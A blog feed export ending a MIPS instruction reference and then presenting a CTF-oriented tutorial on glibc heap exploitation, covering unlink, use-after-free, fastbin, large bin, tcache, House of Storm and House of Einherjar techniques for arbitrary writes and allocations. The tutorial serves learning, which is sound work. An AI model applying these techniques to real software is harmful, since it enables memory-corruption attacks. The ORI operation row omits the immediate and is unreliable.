<p><strong>ORI – Bitwise or immediate</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Bitwise ors a register and an immediate value and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$t &#x3D; $s</td>
</tr>
<tr>
<td>Syntax:</td>
<td>ori $t, $s, imm</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0011 01ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>SB – Store byte</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>The least significant byte of $t is stored at the specified address.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>MEM[$s + offset] &#x3D; (0xff &amp; $t); advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>sb $t, offset($s)</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>1010 00ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>SLL – Shift left logical</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Shifts a register value left by the shift amount listed in the instruction and places the result in a third register. Zeroes are shifted in.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $t &lt;&lt; h; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>sll $d, $t, h</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd dhhh hh00 0000</code></td>
</tr>
</tbody></table>
<p><strong>SLLV – Shift left logical variable</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Shifts a register value left by the value in a second register and places the result in a third register. Zeroes are shifted in.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $t &lt;&lt; $s; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>sllv $d, $t, $s</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d--- --00 0100</code></td>
</tr>
</tbody></table>
<p><strong>SLT – Set on less than (signed)</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>If $s is less than $t, $d is set to one. It gets zero otherwise.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &lt; $t $d &#x3D; 1; advance_pc (4); else $d &#x3D; 0; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>slt $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d000 0010 1010</code></td>
</tr>
</tbody></table>
<p><strong>SLTI – Set on less than immediate (signed)</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>If $s is less than immediate, $t is set to one. It gets zero otherwise.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &lt; imm $t &#x3D; 1; advance_pc (4); else $t &#x3D; 0; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>slti $t, $s, imm</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0010 10ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>SLTIU – Set on less than immediate unsigned</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>If $s is less than the unsigned immediate, $t is set to one. It gets zero otherwise.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &lt; imm $t &#x3D; 1; advance_pc (4); else $t &#x3D; 0; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>sltiu $t, $s, imm</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0010 11ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>SLTU – Set on less than unsigned</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>If $s is less than $t, $d is set to one. It gets zero otherwise.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>if $s &lt; $t $d &#x3D; 1; advance_pc (4); else $d &#x3D; 0; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>sltu $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d000 0010 1011</code></td>
</tr>
</tbody></table>
<p><strong>SRA – Shift right arithmetic</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Shifts a register value right by the shift amount (shamt) and places the value in the destination register. The sign bit is shifted in.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $t &gt;&gt; h; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>sra $d, $t, h</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00-- ---t tttt dddd dhhh hh00 0011</code></td>
</tr>
</tbody></table>
<p><strong>SRL – Shift right logical</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Shifts a register value right by the shift amount (shamt) and places the value in the destination register. Zeroes are shifted in.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $t &gt;&gt; h; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>srl $d, $t, h</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00-- ---t tttt dddd dhhh hh00 0010</code></td>
</tr>
</tbody></table>
<p><strong>SRLV – Shift right logical variable</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Shifts a register value right by the amount specified in $s and places the value in the destination register. Zeroes are shifted in.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $t &gt;&gt; $s; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>srlv $d, $t, $s</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d000 0000 0110</code></td>
</tr>
</tbody></table>
<p><strong>SUB – Subtract</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Subtracts two registers and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $s - $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>sub $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d000 0010 0010</code></td>
</tr>
</tbody></table>
<p><strong>SUBU – Subtract unsigned</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Subtracts two registers and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $s - $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>subu $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d000 0010 0011</code></td>
</tr>
</tbody></table>
<p><strong>SW – Store word</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>The contents of $t is stored at the specified address.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>MEM[$s + offset] &#x3D; $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>sw $t, offset($s)</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>1010 11ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<p><strong>SYSCALL – System call</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Generates a software interrupt.</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>syscall</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00-- ---- ---- ---- ---- --00 1100</code></td>
</tr>
</tbody></table>
<p><strong>XOR – Bitwise exclusive or</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Exclusive ors two registers and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$d &#x3D; $s ^ $t; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>xor $d, $s, $t</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0000 00ss ssst tttt dddd d--- --10 0110</code></td>
</tr>
</tbody></table>
<p><strong>XORI – Bitwise exclusive or immediate</strong></p>
<table>
<thead>
<tr>
<th>Description:</th>
<th>Bitwise exclusive ors a register and an immediate value and stores the result in a register</th>
</tr>
</thead>
<tbody><tr>
<td>Operation:</td>
<td>$t &#x3D; $s ^ imm; advance_pc (4);</td>
</tr>
<tr>
<td>Syntax:</td>
<td>xori $t, $s, imm</td>
</tr>
<tr>
<td>Encoding:</td>
<td><code>0011 10ss ssst tttt iiii iiii iiii iiii</code></td>
</tr>
</tbody></table>
<h3 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h3><p>The whole list is in <a class="link"   href="https://www.dsi.unive.it/~gasparetto/materials/MIPS_Instruction_Set.pdf" >MIPS_Instruction_Set.pdf<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://uweb.engr.arizona.edu/~ece369/Resources/spim/MIPSReference.pdf" >MIPSReference.pdf<i class="fas fa-external-link-alt"></i></a>.</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>arm</tag>
        <tag>mips</tag>
        <tag>x86</tag>
        <tag>cisc</tag>
        <tag>risc</tag>
      </tags>
  </entry>
  <entry>
    <title>Heap Exploit Intro</title>
    <url>/2021/05/12/2021-05-12-Heap-Exploit-Intro/</url>
    <content><![CDATA[<p>Succinct Challenge-Oriented <code>heap</code> exploit introduction. Here we talk about the <code>heap</code> on <code>Linux</code>.</p>
<h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><p>You can visit <a class="link"   href="http://ftp.gnu.org/gnu/glibc" >GNU ftp<i class="fas fa-external-link-alt"></i></a> to check Linux glibc source code. This tells how <code>heap</code> works in details, but truly hard to read.</p>
<p>To understand Linux heap mechanism better, the following image gives us a general look, but it is an older version of glibc <code>heap</code> implementation.<br><img src="/imghost/hei/heap.png" alt="heap"></p>
<p>you can also visit <a class="link"   href="https://github.com/wapiflapi/villoc" >villoc<i class="fas fa-external-link-alt"></i></a> to visualize the process of a program assigning memory when running (click <a class="link"   href="http://wapiflapi.github.io/villoc/" >here<i class="fas fa-external-link-alt"></i></a> to see an example).</p>
<p>It’s better to visit other researchers’ update-to-date blog and read their analysis essays to learn <code>heap</code>.</p>
<h2 id="Heap-Overflow"><a href="#Heap-Overflow" class="headerlink" title="Heap Overflow"></a>Heap Overflow</h2><p>It is similar to <code>stack</code> overflow since they both write too much things to mess up <code>stack</code>&#x2F;<code>heap</code>.<br><code>stack</code> overflow usually overwrite <code>ret addr</code> of a function on the stack to control program flow; <code>heap</code> overflow can break&#x2F;change next chunk structure, fake chunk for <code>unlink</code>, even overwrite things on stack (if chunk is alloced on stack).</p>
<h2 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h2><p><code>unlink</code> is always used for changing where pointer points.</p>
<p>The <code>unlink</code> occurs only when you free a chunk, and another freed chunk (not in fastbin) is next to it. Then that freed chunk will be unlinked (that’s where <code>unlink</code> happens) from its original bin list, and merged with your newly freed chunk. Or when a <code>largebin</code> chunk is allocated the <code>unlink</code> also happens, but except checking <code>fd</code> and <code>bk</code>, the check of <code>fd_nextsize</code> and <code>bk_nextsize</code> is added</p>
<p>***Ancient <code>unlink</code>: ***<br>It just operates as the following image does.<br><img src="/imghost/hei/unlink_smallbin_intro.png" alt="unlink_smallbin_intro"><br>Here we take <code>32-bit</code> chunk as an example (every part in <code>32-bit</code> takes <code>0x4</code> bytes):<br><img src="/imghost/hei/old_unlink_vul.png" alt="old_unlink_vul"><br>The whole process of <code>free</code> chunk <code>Q</code> is:</p>
<ul>
<li><code>glibc</code> judges this chunk to be small chunk</li>
<li>merge forward, find previous in use, so skip</li>
<li>merge backward, find chunk <code>Nextchunk</code> is freed</li>
<li>perform <code>unlink</code> for <code>Nextchunk</code></li>
</ul>
<p>Without check for <code>fd</code> and <code>bk</code>, so we can set them any value. The process of <code>unlink</code>:</p>
<ul>
<li>FD &#x3D; <code>Nextchunk</code>-&gt;<code>fd</code> &#x3D; <code>target addr-12</code> </li>
<li>BK &#x3D; <code>Nextchunk</code>-&gt;<code>bk</code> &#x3D; <code>expect value</code></li>
<li>FD-&gt;<code>bk</code> &#x3D; BK, that is <code>*(target addr-12+12) = BK = expect value</code></li>
<li>BK-&gt;<code>fd</code> &#x3D; FD, that is <code>*(expect value +8) = FD = target addr-12</code></li>
</ul>
<p>Finally we get <code>*(target addr) = expect value</code> (write anywhere anything), but also set <code>*(expect value +8) = target addr-12</code> (sometimes needs to be bypassed).</p>
<p>However more checks were added to <code>unlink</code> nowadays.</p>
<p>***Current <code>unlink</code>: ***<br>New checks here:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// check size</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (<span class="built_in">chunksize</span>(P) != <span class="built_in">prev_size</span> (<span class="built_in">next_chunk</span>(P)), <span class="number">0</span>))      \</span><br><span class="line">      <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);               \</span><br><span class="line"><span class="comment">// check &#x27;fd&#x27; and &#x27;bk&#x27; (linked list integrity check)</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                      \</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br><span class="line"></span><br><span class="line">  <span class="comment">// check &#x27;next_size&#x27; of largebin (linked list integrity check) </span></span><br><span class="line">              <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)              \</span><br><span class="line">                || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    \</span><br><span class="line">              <span class="built_in">malloc_printerr</span> (check_action,                                      \</span><br><span class="line">                               <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span><br><span class="line">                               P, AV);</span><br></pre></td></tr></table></figure>
<p>As we can see, <code>FD-&gt;bk == P &amp;&amp; BK-&gt;fd == P</code> should be satisfied, so <code>fd</code> and <code>bk</code> cannot be set as above did.</p>
<p>To pass this check, we need:</p>
<ul>
<li>fakeFD -&gt; <code>bk</code> &#x3D;&#x3D; P &lt;&#x3D;&gt; *(fakeFD + 12) &#x3D;&#x3D; P</li>
<li>fakeBK -&gt; <code>fd</code> &#x3D;&#x3D; P &lt;&#x3D;&gt; *(fakeBK + 8) &#x3D;&#x3D; P</li>
</ul>
<p>Then in <code>unlink</code>:</p>
<ul>
<li>fakeFD -&gt; <code>bk</code> &#x3D; fakeBK &lt;&#x3D;&gt; *(fakeFD + 12) &#x3D; fakeBK</li>
<li>fakeBK -&gt; <code>fd</code> &#x3D; fakeFD &lt;&#x3D;&gt; *(fakeBK + 8) &#x3D; fakeFD</li>
</ul>
<p>That is:</p>
<ul>
<li>*P &#x3D; P - 8</li>
<li>*P &#x3D; P - 12</li>
</ul>
<p>So the result is <code>*P = P - 12</code>. Well, if we set <code>fd</code>(fakeFD) as <code>nextchunk addr-12</code>, and <code>bk</code>(fakeBK) as <code>nextchunk addr-8</code>, we will get: <code>*nextchunk = nextchunk - 12</code>.<br><img src="/imghost/hei/new_unlink_vul.png" alt="new_unlink_vul"><br>This let <code>nextchunk</code> point to the place close to it. If we can write to it, we may even change <code>nextchunk</code> value to be <code>GOT</code> address and hijack <code>GOT</code> item.</p>
<p>Visit <a href="/2020/09/20/2020-09-20-ADWorld-PWN-Challenge-Area-Write-ups-Unlink/">ADWorld PWN Challenge Area Write-ups (Unlink)</a> for more challenges.</p>
<h2 id="Chunk-Extend-x2F-Overlapping"><a href="#Chunk-Extend-x2F-Overlapping" class="headerlink" title="Chunk Extend&#x2F;Overlapping"></a>Chunk Extend&#x2F;Overlapping</h2><p>The <code>ptmalloc</code> uses chunk header to determine whether chunk is inuse, or locate the post&#x2F;next chunk. </p>
<p>if we adjust (extend&#x2F;shrink) a chunk’s <code>size</code> part, next we <code>malloc</code>&#x2F;<code>free</code> it, the eighboring chunks will be effected (be included into the chunk we operates or sth).</p>
<h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h2><p>The <code>UAF</code> vulnerability exist when you free something but not set that pointer as <code>NULL</code>, while when editing you dont check whether it is freed.</p>
<p>For example: if program prevents you from writing shellcode to <code>A</code> item, but you can write it to <code>B</code> item directly. So you can free <code>A</code> item first and re-assign it as <code>B</code> item, write shellcode to it, and still use it as <code>A</code> item for evil things.</p>
<p>Visit <a href="/2020/08/14/2020-08-14-ADWorld-PWN-Challenge-Area-Write-ups-UAF-Part/">ADWorld PWN Challenge Area Write-ups (UAF Part)</a> to see more challenges.</p>
<h2 id="Fastbin-Attack"><a href="#Fastbin-Attack" class="headerlink" title="Fastbin Attack"></a>Fastbin Attack</h2><p>Attacks around <code>fastbin</code>, includes:</p>
<ol>
<li><code>fastbin</code> double free</li>
</ol>
<p>First free <code>chunk1</code><br><img src="/imghost/hei/fastbin_free_chunk1.png" alt="fastbin_free_chunk1"><br>Second free <code>chunk2</code><br><img src="/imghost/hei/fastbin_free_chunk2.png" alt="fastbin_free_chunk2"><br>Thirdly, free <code>chunk1</code><br><img src="/imghost/hei/fastbin_free_chunk3.png" alt="fastbin_free_chunk3"><br>Then we can make multiple pointers control the same <code>chunk</code>.</p>
<ol start="2">
<li><a href="#House-of-Spirit">House Of Spirit</a></li>
</ol>
<p>a technique in <code>the Malloc Maleficarum</code>. It is to fake one <code>fastbin chunk</code> at some place, which should also bypass some limits in <code>free</code>, to successfully allocate it.<br>Fake a chunk in <code>fastbin</code> size, find a way to <code>free</code> it into <code>fastbin list</code>, and take over the palce through allocating <code>fastbin</code> of that size. </p>
<ol start="3">
<li><p>Alloc to Stack<br>Change <code>fd</code> to points to our carefully constructed fake <code>chunk</code> on <code>stack</code>, then we fetch it to edit the <code>ret addr</code>.</p>
</li>
<li><p>Arbitrary Alloc<br>The target changes from <code>stack</code> to anywhere.</p>
</li>
</ol>
<h2 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h2><p>Since it works differently from <code>fastbin</code>, it can only assign some big number (you will know later) to target address.<br>It fakes an unsorted bin chunk at the end of the bin list, and then allocate all the other real bins in the same list.</p>
<p>When there is only the fake bin in list, its <code>fd</code> points to the <code>fd</code> of <code>unsortedbin</code> in <code>malloc_state</code> struct, might be <code>main_arena + 0x88</code>. In <code>glibc</code> it must starts with <code>0x7f</code> (can be regarded as the <code>size</code> of a <code>fastbin</code>). So it works for <code>fastbin attack</code> to find&#x2F;make the target.</p>
<h2 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h2><p>It happens when the <code>largebin</code> double linked list inserting or removing chunks, and it leads to:</p>
<ul>
<li>Unexpected memory allocating: when requesting for a <code>largebin</code> (<code>malloc</code>), fake the <code>bk_nextsize</code> of the <code>largebin</code> chunk first.<ul>
<li>set <code>bk_nextsize</code> as the target address</li>
<li>set target’s fake <code>fd</code> and <code>bk</code> as what we did in <a href="/#Unlink"><code>unlink</code></a> to bypass <code>unsorted bin unlink</code>.</li>
<li>set target’s fake <code>bk_nextsize</code> and <code>fd_nextsize</code> as <code>0</code> to skip <code>large bin unlink</code> operation (it will do <code>unsorted bin unlink</code> instead).</li>
<li>the fake chunk starting at target address will be allocated.</li>
</ul>
</li>
<li>Write <code>heap</code> address anywhere: when inserting a <code>largebin</code> chunk (<code>free</code>), fake the <code>bk_nextsize</code> and <code>bk</code>.<ul>
<li>set <code>fwd-&gt;bk_nextsize</code> as <code>evil_addr-0x20</code>. After executing <code>victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize</code> the <code>victim-&gt;bk_nextsize</code> is also set as <code>evil_addr-0x20</code>. Then <code>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim</code> writes <code>victim addr</code> to <code>evil_addr-0x20-&gt;fd_nextsize</code>, that is writing <code>victim addr</code> to <code>evil_addr</code>.</li>
</ul>
<ul>
<li>Related codes:<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; </span><br><span class="line">...</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; </span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>set <code>fwd-&gt;bk</code> as <code>evil_addr-0x10</code>. After <code>bck = fwd-&gt;bk</code> it sets <code>bck</code> as <code>evil_addr-0x10</code>. Then the <code>bck-&gt;fd = victim</code> writes <code>victim addr</code> to <code>evil_addr-0x10-&gt;fd</code>, that is writing <code>victim addr</code> to <code>evil_addr</code>.</li>
</ul>
<ul>
<li>Related codes:<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">bck = fwd-&gt;bk; </span><br><span class="line">...</span><br><span class="line">bck-&gt;fd = victim; </span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li>As for where to write,  the <code>global_max_fast</code> might be a good place to write a big number to.</li>
</ul>
</li>
</ul>
<h2 id="House-of-Storm"><a href="#House-of-Storm" class="headerlink" title="House of Storm"></a>House of Storm</h2><p>We get two chances of writing <code>heap</code> address anywhere by faking <code>bk_nextsize</code> and <code>bk</code> of <code>largebin</code> chunk. Except <code>global_max_fast</code> another exploit is <code>House of Storm</code>. Combining with <code>unsorted bin attack</code> we can make it to be allocating any memory.</p>
<p>We have to meet some conditions:</p>
<ol>
<li>There is a chunk <code>A</code> in <code>largebin</code></li>
<li>And a chunk <code>B</code> in <code>unsorted bin</code></li>
<li>The size of <code>B</code> is greater than size of <code>A</code></li>
</ol>
<p>When <code>malloc</code> a <code>0x48-0x58</code> chunk:</p>
<ul>
<li>If we set <code>A-&gt;bk_nextsize</code> as <code>evil_addr-0x20+8-5</code>, set <code>A-&gt;bk</code> as <code>evil_addr-0x10+0x18</code> and set <code>B-&gt;bk</code> as <code>evil_addr</code></li>
<li>It first searches <code>unsorted bin</code> and sorts them <code>small/large bin</code></li>
<li>Then triggers <code>unsorted bin attack</code>, <code>unsorted bin-&gt;bk</code> points to <code>evil_addr</code></li>
<li>Next, chunk <code>B</code> is inserted into <code>largebin</code>. When <code>PIE</code> is enabled, the <code>heap</code> address always starts with <code>0x56</code> or <code>0x55</code> (<code>fastbin</code> chunk size), that size is suitable for our <code>malloc</code> request.</li>
<li>As we write <code>heap</code> address into <code>evil_addr+0x8-5</code> (fake size) and <code>evil_addr+0x18</code> (fake <code>bk</code>), the fake chunk will be like (if we set <code>evil_addr</code> as <code>__free_hook</code>):<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">heap &amp;__free_hook</span><br><span class="line">$1=&#123;</span><br><span class="line">  prev_size = xxxxxxxxxx,</span><br><span class="line">  size = 0x56,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x56xxxxxxxxxxxx,</span><br><span class="line">  fd_nextsize = 0,</span><br><span class="line">  bk_nextsize = 0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
Since the size fits our <code>malloc</code> request well, we <code>malloc</code> the faked chunk starting at <code>evil_addr</code>.</li>
</ul>
<p>So in the next big <code>for</code> loop (<code>malloc</code> loop) the faked <code>unsorted bin</code> will be removed&#x2F;allocated.<br>As <code>evil_addr-&gt;bk</code> points to <code>heap</code> address, it bypasses limit of <code>bck-&gt;fd = unsorted_chunks (av)</code>. </p>
<h2 id="Tcache-Attack"><a href="#Tcache-Attack" class="headerlink" title="Tcache Attack"></a>Tcache Attack</h2><p>First have a look at the source of new structures: </p>
<ol>
<li><code>tcache_entry</code> <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure></li>
<li>and <code>tcache_perthread_struct</code><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<img src="/imghost/hei/006AWYXBly1fw87zlnrhtj30nh0ciglz.jpg" alt="tcache"><br>And the running mechanism is:</li>
</ol>
<ul>
<li><code>free</code>: if size &lt; <code>smallbin</code> size<ul>
<li>before <code>tcache</code>:<ul>
<li>put chunks into <code>fastbin</code> or <code>unsortedbin</code></li>
</ul>
</li>
<li>after <code>tcache</code>:<ul>
<li>put into <code>tcache</code></li>
<li>but only 7 chunks by default, for <code>tcache</code> of same size</li>
<li>if the list is full, then put into <code>fastbin</code> or <code>unsortedbin</code></li>
</ul>
</li>
</ul>
</li>
<li><code>malloc</code>: if size in <code>tcache</code> size range<ul>
<li>take from <code>tcache</code> if not empty</li>
<li>find if <code>fastbin/smallbin/unsorted bin</code> have available chunks.</li>
<li>if they got, chunks will be moved from <code>fastbin/smallbin/unsorted bin</code> to <code>tcache</code> until it’s full</li>
<li>then <code>malloc</code> will take chunk in <code>tcache</code></li>
</ul>
</li>
</ul>
<ul>
<li><p>tcache poisoning<br>overwrite pointer <code>next</code>, without checks we can <code>malloc</code> everywhere.</p>
</li>
<li><p>tcache dup<br>since in libc 2.26 there is no checks for double free, so we can build cycliced list in <code>tcache</code> like what we do in old <code>fastbin</code> double free</p>
</li>
<li><p>tcache perthread corruption<br>the <code>tcache_perthread_struct</code> manage the whole <code>tcache</code> structure, if we find a way to control it, we can change the <code>entries</code> and other related addresses</p>
</li>
<li><p>tcache house of spirit<br>using <code>tcache</code> to do house of spirit, fake a chunk on stack or sth to bypass some checks, link in into <code>tcache</code> and we can alloc it.</p>
</li>
<li><p>smallbin unlink<br>when putting <code>smallbin</code> to <code>tcache</code>, there exists <code>unlink</code> operations with weak checks</p>
</li>
<li><p>tcache stashing unlink attack<br>when using <code>calloc</code> it won’t take chunks from <code>tcache</code>, so there will be unlinks</p>
</li>
<li><p>libc leak<br>if we want to reproduce <code>unsortedbin attack</code>, we have to fullfill the <code>tcache</code>, then the chunks will be put into <code>unsortedbin</code></p>
</li>
<li><p>protection enhancement in <code>glibc</code> 2.27</p>
</li>
</ul>
<ol>
<li>in <code>tcache_entry</code> add ptr <code>key</code></li>
<li>set max num of <code>tcache</code></li>
<li>in <code>tcache_put()</code>, let <code>key</code> of a <code>tcache_entry</code> point to <code>tcache</code>, for checking double free</li>
<li>in <code>tcache_get()</code>, clean pointer <code>key</code> when removing <code>chunk</code> from <code>tcache</code></li>
<li>in <code>int_free()</code>, check whether the chunk to free is in <code>tcache</code> list, and will print <code>free(): double free detected in tcache 2</code></li>
<li>in <code>_int_realloc()</code>, use <code>memcpy()</code> instead copy bit by bit, more concise</li>
<li>in <code>do_set_tcache_count()</code>, limit <code>tcache_count</code> to be smaller than <code>MAX_TCACHE_COUNT</code> (127)</li>
</ol>
<p>Visit <a href="/2020/10/26/2020-10-26-ADWorld-PWN-Challenge-Area-Write-ups-Tcache/">ADWorld PWN Challenge Area Write-ups (Tcache)</a> for some challenges.</p>
<h2 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a>House of Einherjar</h2><p>I can force <code>malloc</code> chunk at almost anywhere, by exploiting <code>consolidate backward</code> in <code>free</code>.</p>
<p>The key part of the code in <code>free</code>:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">prev_inuse</span>(p)) &#123;</span><br><span class="line">    prevsize = <span class="built_in">prev_size</span>(p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = <span class="built_in">chunk_at_offset</span>(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    <span class="built_in">unlink</span>(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>And the effect is like:<img src="/imghost/hei/backward_consolidate.png" alt="backward_consolidate"><br>So the <code>p</code> we finally get is based on the original <code>p</code> and its <code>prevsize</code>, also with some security checks.</p>
